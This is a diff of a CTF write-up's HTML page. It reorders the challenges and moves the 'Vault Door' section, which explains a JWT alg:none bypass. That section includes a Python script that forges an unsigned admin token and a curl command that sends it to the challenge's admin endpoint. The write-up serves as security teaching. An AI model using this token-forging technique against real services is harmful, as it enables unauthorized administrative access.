@@ -152,7 +152,7 @@ span.linenos.special { color: #000000; background-color: #ffffc0; padding-left: 
 <p><em>One APK, six challenges, and a chain that ends in someone else's S3 bucket. Here's every solve, from <code>strings</code> to SSRF.</em></p>
 <hr />
 <p>FamPay ran a genuinely well-built security CTF, and I managed to clear the <strong>full board: all 6 challenges (1,850 pts)</strong>. What made it fun is that almost everything ships inside <strong>one Android APK</strong> (<code>fam-ctf.apk</code>, the same file linked from every challenge card), and each challenge peels back a different layer of the same app. Hardcoded native secrets, weak Firebase rules, a debug App Check bypass, a backdoored custom signing scheme, a classic JWT bypass, and then the finale breaks out of the app entirely into <strong>AWS</strong> via an SSRF-to-metadata chain against a live EC2 instance.</p>
-<p>This is a full walkthrough of all six, in ascending difficulty. Everything used is free and open-source, with no root or emulator needed.</p>
+<p>This is a full walkthrough of all six, in order. Everything used is free and open-source, with no root or emulator needed.</p>
 <p><strong>Tooling:</strong>
 - <code>unzip</code>, <code>strings</code>, <code>objdump</code>, <code>readelf</code>, <code>nm</code> (binutils)
 - <a href="https://github.com/androguard/androguard"><code>androguard</code></a> decompiles <code>classes*.dex</code> back to readable Java
@@ -256,37 +256,6 @@ curl<span class="w"> </span>-s<span class="w"> </span><span class="s2">&quot;htt
 <p><img alt="fampay-ctf-03-firestore.png" src="img/fampay-ctf-03-firestore.png" /></p>
 <p><strong>Flag:</strong> <code>FAM{4pp_ch3ck_byp4ss_g00d_j0b}</code></p>
 <hr />
-<h2>[05] The Vault Door (350 pts, Web)</h2>
-<blockquote>
-<p><em>NexaVault is an internal credential management portal. Only administrators can open the Vault. You have been given access to create an account. That's it.</em></p>
-</blockquote>
-<p><img alt="fampay-ctf-05-vault-door.png" src="img/fampay-ctf-05-vault-door.png" /></p>
-<p>Registering an account returns a session cookie, <code>nx_access</code>, that decodes as a JWT:</p>
-<div class="codehilite"><pre><span></span><code><span class="c1">// header:  {&quot;alg&quot;:&quot;HS256&quot;,&quot;typ&quot;:&quot;JWT&quot;}</span>
-<span class="c1">// payload: {&quot;sub&quot;:&quot;famtester01&quot;,&quot;role&quot;:&quot;user&quot;}</span>
-</code></pre></div>
-
-<p><code>/famctf/admin</code> requires <code>role: admin</code>.</p>
-<p><strong>The vulnerability:</strong> classic JWT <strong><code>alg:none</code></strong> bypass: the server accepts an unsigned token as long as the header claims <code>alg: none</code>, never checking whether that's a permitted algorithm.</p>
-<p>Forge a token with <code>alg: none</code>, <code>role: admin</code>, and an empty signature:</p>
-<div class="codehilite"><pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">base64</span><span class="o">,</span><span class="w"> </span><span class="nn">json</span>
-<span class="k">def</span><span class="w"> </span><span class="nf">b64url</span><span class="p">(</span><span class="n">d</span><span class="p">):</span> <span class="k">return</span> <span class="n">base64</span><span class="o">.</span><span class="n">urlsafe_b64encode</span><span class="p">(</span><span class="n">d</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;=&#39;</span><span class="p">)</span>
-<span class="n">header</span>  <span class="o">=</span> <span class="p">{</span><span class="s2">&quot;alg&quot;</span><span class="p">:</span> <span class="s2">&quot;none&quot;</span><span class="p">,</span> <span class="s2">&quot;typ&quot;</span><span class="p">:</span> <span class="s2">&quot;JWT&quot;</span><span class="p">}</span>
-<span class="n">payload</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&quot;sub&quot;</span><span class="p">:</span> <span class="s2">&quot;famtester01&quot;</span><span class="p">,</span> <span class="s2">&quot;role&quot;</span><span class="p">:</span> <span class="s2">&quot;admin&quot;</span><span class="p">}</span>
-<span class="n">h</span> <span class="o">=</span> <span class="n">b64url</span><span class="p">(</span><span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">header</span><span class="p">,</span>  <span class="n">separators</span><span class="o">=</span><span class="p">(</span><span class="s1">&#39;,&#39;</span><span class="p">,</span><span class="s1">&#39;:&#39;</span><span class="p">))</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
-<span class="n">p</span> <span class="o">=</span> <span class="n">b64url</span><span class="p">(</span><span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="n">separators</span><span class="o">=</span><span class="p">(</span><span class="s1">&#39;,&#39;</span><span class="p">,</span><span class="s1">&#39;:&#39;</span><span class="p">))</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
-<span class="nb">print</span><span class="p">((</span><span class="n">h</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;.&#39;</span> <span class="o">+</span> <span class="n">p</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;.&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
-</code></pre></div>
-
-<p>Send it as the session cookie:</p>
-<div class="codehilite"><pre><span></span><code>curl<span class="w"> </span>-s<span class="w"> </span><span class="s2">&quot;https://ctf.fampay.co/famctf/admin&quot;</span><span class="w"> </span><span class="se">\</span>
-<span class="w">  </span>-H<span class="w"> </span><span class="s2">&quot;Cookie: nx_access=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJmYW10ZXN0ZXIwMSIsInJvbGUiOiJhZG1pbiJ9.&quot;</span>
-<span class="c1"># Vault Payload: FAM{jwt_4lg_n0n3_byp4ss_gr4nt3d}</span>
-</code></pre></div>
-
-<p><img alt="fampay-ctf-05-jwt-none.png" src="img/fampay-ctf-05-jwt-none.png" /></p>
-<p><strong>Flag:</strong> <code>FAM{jwt_4lg_n0n3_byp4ss_gr4nt3d}</code></p>
-<hr />
 <h2>[04] The Endpoint (400 pts, Reversing + Web)</h2>
 <blockquote>
 <p><em>The server only trusts what it can verify. Intercept. Modify. But can you keep it honest? Hint: only admin has clearance.</em></p>
@@ -339,6 +308,37 @@ curl<span class="w"> </span>-s<span class="w"> </span><span class="s2">&quot;htt
 
 <p><img alt="fampay-ctf-04-native-sig.png" src="img/fampay-ctf-04-native-sig.png" /></p>
 <p><strong>Flag:</strong> <code>FAM{x_s1gn4tur3_r3v3rs3d_n1c3ly}</code></p>
+<hr />
+<h2>[05] The Vault Door (350 pts, Web)</h2>
+<blockquote>
+<p><em>NexaVault is an internal credential management portal. Only administrators can open the Vault. You have been given access to create an account. That's it.</em></p>
+</blockquote>
+<p><img alt="fampay-ctf-05-vault-door.png" src="img/fampay-ctf-05-vault-door.png" /></p>
+<p>Registering an account returns a session cookie, <code>nx_access</code>, that decodes as a JWT:</p>
+<div class="codehilite"><pre><span></span><code><span class="c1">// header:  {&quot;alg&quot;:&quot;HS256&quot;,&quot;typ&quot;:&quot;JWT&quot;}</span>
+<span class="c1">// payload: {&quot;sub&quot;:&quot;famtester01&quot;,&quot;role&quot;:&quot;user&quot;}</span>
+</code></pre></div>
+
+<p><code>/famctf/admin</code> requires <code>role: admin</code>.</p>
+<p><strong>The vulnerability:</strong> classic JWT <strong><code>alg:none</code></strong> bypass: the server accepts an unsigned token as long as the header claims <code>alg: none</code>, never checking whether that's a permitted algorithm.</p>
+<p>Forge a token with <code>alg: none</code>, <code>role: admin</code>, and an empty signature:</p>
+<div class="codehilite"><pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">base64</span><span class="o">,</span><span class="w"> </span><span class="nn">json</span>
+<span class="k">def</span><span class="w"> </span><span class="nf">b64url</span><span class="p">(</span><span class="n">d</span><span class="p">):</span> <span class="k">return</span> <span class="n">base64</span><span class="o">.</span><span class="n">urlsafe_b64encode</span><span class="p">(</span><span class="n">d</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;=&#39;</span><span class="p">)</span>
+<span class="n">header</span>  <span class="o">=</span> <span class="p">{</span><span class="s2">&quot;alg&quot;</span><span class="p">:</span> <span class="s2">&quot;none&quot;</span><span class="p">,</span> <span class="s2">&quot;typ&quot;</span><span class="p">:</span> <span class="s2">&quot;JWT&quot;</span><span class="p">}</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&quot;sub&quot;</span><span class="p">:</span> <span class="s2">&quot;famtester01&quot;</span><span class="p">,</span> <span class="s2">&quot;role&quot;</span><span class="p">:</span> <span class="s2">&quot;admin&quot;</span><span class="p">}</span>
+<span class="n">h</span> <span class="o">=</span> <span class="n">b64url</span><span class="p">(</span><span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">header</span><span class="p">,</span>  <span class="n">separators</span><span class="o">=</span><span class="p">(</span><span class="s1">&#39;,&#39;</span><span class="p">,</span><span class="s1">&#39;:&#39;</span><span class="p">))</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+<span class="n">p</span> <span class="o">=</span> <span class="n">b64url</span><span class="p">(</span><span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="n">separators</span><span class="o">=</span><span class="p">(</span><span class="s1">&#39;,&#39;</span><span class="p">,</span><span class="s1">&#39;:&#39;</span><span class="p">))</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+<span class="nb">print</span><span class="p">((</span><span class="n">h</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;.&#39;</span> <span class="o">+</span> <span class="n">p</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;.&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
+</code></pre></div>
+
+<p>Send it as the session cookie:</p>
+<div class="codehilite"><pre><span></span><code>curl<span class="w"> </span>-s<span class="w"> </span><span class="s2">&quot;https://ctf.fampay.co/famctf/admin&quot;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-H<span class="w"> </span><span class="s2">&quot;Cookie: nx_access=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJmYW10ZXN0ZXIwMSIsInJvbGUiOiJhZG1pbiJ9.&quot;</span>
+<span class="c1"># Vault Payload: FAM{jwt_4lg_n0n3_byp4ss_gr4nt3d}</span>
+</code></pre></div>
+
+<p><img alt="fampay-ctf-05-jwt-none.png" src="img/fampay-ctf-05-jwt-none.png" /></p>
+<p><strong>Flag:</strong> <code>FAM{jwt_4lg_n0n3_byp4ss_gr4nt3d}</code></p>
 <hr />
 <h2>[06] The Cloud (500 pts, Cloud / SSRF)</h2>
 <blockquote>
